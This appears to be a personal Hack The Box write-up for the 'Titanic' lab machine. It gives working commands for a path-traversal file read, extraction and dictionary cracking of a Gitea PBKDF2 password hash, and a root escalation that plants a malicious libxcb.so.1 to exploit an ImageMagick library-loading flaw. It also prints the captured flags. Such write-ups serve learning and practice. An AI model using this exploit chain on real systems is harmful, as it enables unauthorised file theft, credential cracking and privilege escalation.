Starting off with nmap 
```
sudo nmap -sC -sV -vvv -Pn -p- --min-rate 20000 --stats-every 50s 10.10.11.55
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-27 17:45 CDT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 17:45
Completed NSE at 17:45, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 17:45
Completed NSE at 17:45, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 17:45
Completed NSE at 17:45, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 17:45
Completed Parallel DNS resolution of 1 host. at 17:45, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 17:45
Scanning 10.10.11.55 [65535 ports]
Discovered open port 22/tcp on 10.10.11.55
Discovered open port 80/tcp on 10.10.11.55
Increasing send delay for 10.10.11.55 from 0 to 5 due to 4331 out of 14435 dropped probes since last increase.
Increasing send delay for 10.10.11.55 from 5 to 10 due to max_successful_tryno increase to 4
Increasing send delay for 10.10.11.55 from 10 to 20 due to max_successful_tryno increase to 5
Increasing send delay for 10.10.11.55 from 20 to 40 due to max_successful_tryno increase to 6
Increasing send delay for 10.10.11.55 from 40 to 80 due to 4391 out of 14636 dropped probes since last increase.
Increasing send delay for 10.10.11.55 from 80 to 160 due to 2556 out of 8519 dropped probes since last increase.
Increasing send delay for 10.10.11.55 from 160 to 320 due to max_successful_tryno increase to 7
Increasing send delay for 10.10.11.55 from 320 to 640 due to max_successful_tryno increase to 8
Increasing send delay for 10.10.11.55 from 640 to 1000 due to 646 out of 2152 dropped probes since last increase.
Completed SYN Stealth Scan at 17:46, 5.94s elapsed (65535 total ports)
Initiating Service scan at 17:46
Scanning 2 services on 10.10.11.55
Completed Service scan at 17:46, 6.42s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.11.55.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 17:46
Completed NSE at 17:46, 5.62s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 17:46
Completed NSE at 17:46, 0.81s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 17:46
Completed NSE at 17:46, 0.00s elapsed
Nmap scan report for 10.10.11.55
Host is up, received user-set (0.20s latency).
Scanned at 2025-04-27 17:45:58 CDT for 19s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 73:03:9c:76:eb:04:f1:fe:c9:e9:80:44:9c:7f:13:46 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGZG4yHYcDPrtn7U0l+ertBhGBgjIeH9vWnZcmqH0cvmCNvdcDY/ItR3tdB4yMJp0ZTth5itUVtlJJGHRYAZ8Wg=
|   256 d5:bd:1d:5e:9a:86:1c:eb:88:63:4d:5f:88:4b:7e:04 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDT1btWpkcbHWpNEEqICTtbAcQQitzOiPOmc3ZE0A69Z
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://titanic.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: titanic.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 17:46
Completed NSE at 17:46, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 17:46
Completed NSE at 17:46, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 17:46
Completed NSE at 17:46, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.09 seconds
           Raw packets sent: 101516 (4.467MB) | Rcvd: 70467 (2.819MB)
```
We see two ports open 22, and 80. We can also see it redirects us to titanic.htb so we will include this within our hosts file 

The website is pretty static except the `Book Now` tab in which we can register for something. I will capture this request on burp and send to repeater 
```
POST /book HTTP/1.1
Host: titanic.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://titanic.htb/
Content-Type: application/x-www-form-urlencoded
Content-Length: 70
Origin: http://titanic.htb
DNT: 1
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Priority: u=0, i

name=test&email=test%40test.com&phone=1&date=2025-01-01&cabin=Standard
```
If we send this request
```
<SNIP>
/download?ticket=59878786-9537-4120-90a8-567b9382f942.json
<SNIP>
```
This is very interesting as this might be vulnerable to LFI attack. I'll use curl for this 
```
curl http://titanic.htb/download?ticket=../../../../etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
<SNIP>
developer:x:1000:1000:developer:/home/developer:/bin/bash
<SNIP>
```
Before we begin to enumerate this user any further I will do some enumeration in the background and look for some vhosts
```
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://titanic.htb/ -H 'Host: FUZZ.titanic.htb' -mc 200 -s
dev
```
I will then add this into my hosts file.

I can then try to download user.txt 
```
GET /download?ticket=../../../../home/developer/user.txt HTTP/1.1
Host: titanic.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://titanic.htb/
DNT: 1
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Priority: u=0, i
```
It works 
```
HTTP/1.1 200 OK
Date: Sun, 27 Apr 2025 23:59:53 GMT
Server: Werkzeug/3.0.3 Python/3.10.12
Content-Disposition: attachment; filename="../../../../home/developer/user.txt"
Content-Type: text/plain; charset=utf-8
Content-Length: 33
Last-Modified: Sun, 27 Apr 2025 22:42:04 GMT
Cache-Control: no-cache
ETag: "1745793724.3145938-33-3221623182"
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive

710b939332261a6c829e2cfb7e7xxxxx
```
Looking at `dev.titanic.htb` we can see it directs us to a gitea page, from our LFI vuln we found we can look for this on user. I referred to chatgpt asking where the most common places for gitea databases were, it initially gave me /var/lib though I figured it would most likely to be in the home directory of this user, so I manipulated the path to look like
```
../../../../home/developer/gitea/data/gitea/gitea.db
```
If we curl this we would get a very large output, I piped it into a .txt file and then looked for hashes. 
```
M7
!developerdeveloperdeveloper@titanic.htbenablede531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56pbkdf2$50000$500ce6f07fc9b557bc070fa7bef76a0d158bf3e3452b78544f8bee9400d6936d34en-USf¬¹>f¬×f¬×ÿe2d95b7e207e432f62f3508be406c11bdeveloper@titanic.htbgitea-auto`0
```
Great, we can see that this is using a pbkdf2 algorithm, we can also see that it also uses 50000 iterations. 

To crack this, we will use original hash e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56

and then the salt 8bf3e3452b78544f8bee9400d6936d34. We will be using this as the salt as PBKDF2 does not require the entire salt to be uses. Intead, it uses only the portion of the salt which is relevant for hashing. The original salt (`500ce6f07fc9b557bc070fa7bef76a0d158bf3e3452b78544f8bee9400d6936d34`) is 128 characters long. (64 bytes when decoded from hex). However, PBKDF2 implementations often truncate the salt to a smaller zie, typically only 32 bytes or less depending on the system. 

The substring `8bf3e3452b78544f8bee9400d6936d34` represents the last 32 characters (16 bytes) of the original salt. This suggests that the application truncates the salt to 16 bytes before using it in the PBKDF2 function.

We can use a script like this 
```
import hashlib
import binascii

def generate_pbkdf2_hash(password: str, salt: bytes, iterations: int = 50000, dklen: int = 50) -> bytes:
    """
    Generate a PBKDF2 hash using SHA-256.
    """
    return hashlib.pbkdf2_hmac('sha256', password.encode('utf-8'), salt, iterations, dklen)

def crack_password(dictionary_file: str, target_hash: str, salt: bytes, iterations: int = 50000, dklen: int = 50) -> str:
    """
    Attempt to crack a PBKDF2 hash by testing passwords from a dictionary file.
    """
    # Convert the target hash from hex to bytes
    target_hash_bytes = binascii.unhexlify(target_hash)
    
    # Open the dictionary file and iterate through passwords
    with open(dictionary_file, 'r', encoding='utf-8', errors='ignore') as file:
        for count, line in enumerate(file, start=1):
            password = line.strip()
            
            # Generate the hash for the current password
            derived_key = generate_pbkdf2_hash(password, salt, iterations, dklen)
            
            # Print progress every 1,000 passwords
            if count % 1000 == 0:
                print(f"Tested {count} passwords so far...")
            
            # Check if the derived key matches the target hash
            if derived_key == target_hash_bytes:
                print(f"\nPassword cracked: {password}")
                return password
    
    print("\nPassword not found in the dictionary.")
    return None

# Configuration
salt = binascii.unhexlify('8bf3e3452b78544f8bee9400d6936d34')  # Salt in bytes
target_hash = 'e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56'  # Target hash (hex)
dictionary_file = '/usr/share/wordlists/rockyou.txt'  # Path to the wordlist

# Start cracking
cracked_password = crack_password(dictionary_file, target_hash, salt)

if cracked_password:
    print(f"Success! The password is: {cracked_password}")
else:
    print("Failed to crack the password.")
```

```
python3 crack2.py
Tested 1000 passwords so far...
Tested 2000 passwords so far...
Tested 3000 passwords so far...
Tested 4000 passwords so far...
Tested 5000 passwords so far...

Password cracked: 25282528
Success! The password is: 25282528
```
We can now try to ssh into user developer 
```
ssh developer@10.10.11.55
The authenticity of host '10.10.11.55 (10.10.11.55)' can't be established.
ED25519 key fingerprint is SHA256:Ku8uHj9CN/ZIoay7zsSmUDopgYkPmN7ugINXU0b2GEQ.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.55' (ED25519) to the list of known hosts.
developer@10.10.11.55's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-131-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sun Apr 27 11:25:32 PM UTC 2025

  System load:           0.0
  Usage of /:            67.6% of 6.79GB
  Memory usage:          14%
  Swap usage:            0%
  Processes:             229
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.55
  IPv6 address for eth0: dead:beef::250:56ff:fe95:5ae0


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

developer@titanic:~$ ls
gitea  mysql  user.txt
```
I will now download linpeas onto my box and then on target 
```
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
--2025-04-27 19:27:08--  https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
Resolving github.com (github.com)... 140.82.113.3
Connecting to github.com (github.com)|140.82.113.3|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://github.com/peass-ng/PEASS-ng/releases/download/20250424-d80957fb/linpeas.sh [following]
--2025-04-27 19:27:09--  https://github.com/peass-ng/PEASS-ng/releases/download/20250424-d80957fb/linpeas.sh
Reusing existing connection to github.com:443.
HTTP request sent, awaiting response... 302 Found
Location: https://objects.githubusercontent.com/github-production-release-asset-2e65be/165548191/19407164-4792-46ab-8868-e8894c421c06?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=releaseassetproduction%2F20250428%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20250428T002709Z&X-Amz-Expires=300&X-Amz-Signature=5d728e7033f6112b1c2cf9be5ca3da2e9cc42605b3d566c9b3909f53ce65d8ce&X-Amz-SignedHeaders=host&response-content-disposition=attachment%3B%20filename%3Dlinpeas.sh&response-content-type=application%2Foctet-stream [following]
--2025-04-27 19:27:09--  https://objects.githubusercontent.com/github-production-release-asset-2e65be/165548191/19407164-4792-46ab-8868-e8894c421c06?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=releaseassetproduction%2F20250428%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20250428T002709Z&X-Amz-Expires=300&X-Amz-Signature=5d728e7033f6112b1c2cf9be5ca3da2e9cc42605b3d566c9b3909f53ce65d8ce&X-Amz-SignedHeaders=host&response-content-disposition=attachment%3B%20filename%3Dlinpeas.sh&response-content-type=application%2Foctet-stream
Resolving objects.githubusercontent.com (objects.githubusercontent.com)... 185.199.109.133, 185.199.110.133, 185.199.108.133, ...
Connecting to objects.githubusercontent.com (objects.githubusercontent.com)|185.199.109.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 840139 (820K) [application/octet-stream]
Saving to: ‘linpeas.sh’

linpeas.sh          100%[===================>] 820.45K  --.-KB/s    in 0.007s  

2025-04-27 19:27:09 (120 MB/s) - ‘linpeas.sh’ saved [840139/840139]

chmod +x linpeas.sh 

python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.11.55 - - [27/Apr/2025 19:27:40] "GET /linpeas.sh HTTP/1.1" 200 -
```
On target machine
```
wget http://10.10.14.25:8000/linpeas.sh
--2025-04-28 00:26:39--  http://10.10.14.25:8000/linpeas.sh
Connecting to 10.10.14.25:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 840139 (820K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh          100%[===================>] 820.45K   804KB/s    in 1.0s    

2025-04-28 00:26:40 (804 KB/s) - ‘linpeas.sh’ saved [840139/840139]

developer@titanic:~$ chmod +x linpeas.sh 
developer@titanic:~$ ./linpeas.sh 
```
These things stood out to me 
```
╔══════════╣ Executable files potentially added by user (limit 70)
2025-02-07+11:24:14.6853932020 /usr/local/sbin/laurel
2025-02-03+17:11:30.8632630370 /opt/scripts/identify_images.sh
2025-01-27+16:58:09.1138300540 /etc/update-motd.d/99-legal
2024-08-02+14:07:35.8360909790 /usr/bin/magick
```
We can see a script and also a magick file. I will go over and see what this script does 
```
developer@titanic:/opt/scripts$ cat identify_images.sh 
cd /opt/app/static/assets/images
truncate -s 0 metadata.log
find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log
```
we can see it tries to find an image with .jpg in /opt/app/static/assests/images. We can also see the magick file again. So 
im going to look at some vulnerabilties in which I found this github repo which goes through it really well 

https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8

we will check version 
```
developer@titanic:/opt/scripts$ magick -version
Version: ImageMagick 7.1.1-35 Q16-HDRI x86_64 1bfce2a62:20240713 https://imagemagick.org
Copyright: (C) 1999 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5) 
Delegates (built-in): bzlib djvu fontconfig freetype heic jbig jng jp2 jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
Compiler: gcc (9.4)
```
we can see we are using same version, now all Im going to do within the /opt/app/static/assets/images/ directory is literally copy and paste the the gcc command but instead of system id I will run system cat root.txt and out it into tmp folder 
```
gcc -x c -shared -fPIC -o libxcb.so.1 - << 'EOF'
#include <stdlib.h>
#include <unistd.h>      // for _exit()
__attribute__((constructor))
static void init(void) {
    system("cat /root/root.txt > /tmp/rootflag");
    _exit(0);
}
EOF
```
After running that you should see something like this 
```
developer@titanic:/opt/app/static/assets/images$ gcc -x c -shared -fPIC -o libxcb.so.1 - << 'EOF'
#include <stdlib.h>
#include <unistd.h>      // for _exit()
__attribute__((constructor))
static void init(void) {
    system("cat /root/root.txt > /tmp/rootflag");
    _exit(0);
}
EOF
developer@titanic:/opt/app/static/assets/images$ ls
entertainment.jpg     favicon.ico  home.jpg     luxury-cabins.jpg
exquisite-dining.jpg  libxcb.so.1  metadata.log
```
I will now copy home.jpg and make another one 
```
developer@titanic:/opt/app/static/assets/images$ cp home.jpg home3.jpg
developer@titanic:/opt/app/static/assets/images$ ls /tmp
rootflag
snap-private-tmp
ssh_client_ip_developer
systemd-private-5d4c53807ea04c9caaa276fc9d8cd6a1-apache2.service-ChsJef
systemd-private-5d4c53807ea04c9caaa276fc9d8cd6a1-fwupd.service-wYy1LJ
systemd-private-5d4c53807ea04c9caaa276fc9d8cd6a1-ModemManager.service-e2w0yo
systemd-private-5d4c53807ea04c9caaa276fc9d8cd6a1-systemd-logind.service-9sXQ9w
systemd-private-5d4c53807ea04c9caaa276fc9d8cd6a1-systemd-resolved.service-L2APOV
systemd-private-5d4c53807ea04c9caaa276fc9d8cd6a1-systemd-timesyncd.service-dbThfP
systemd-private-5d4c53807ea04c9caaa276fc9d8cd6a1-upower.service-me3PCs
tmux-1000
vmware-root_616-2689143977
developer@titanic:/opt/app/static/assets/images$ 
```
Now get flag 
```
developer@titanic:/opt/app/static/assets/images$ cat /tmp/rootflag 
7d7316d9cc164b4b65ee6458b9697ab3
```




[[Practice (HTB)]]

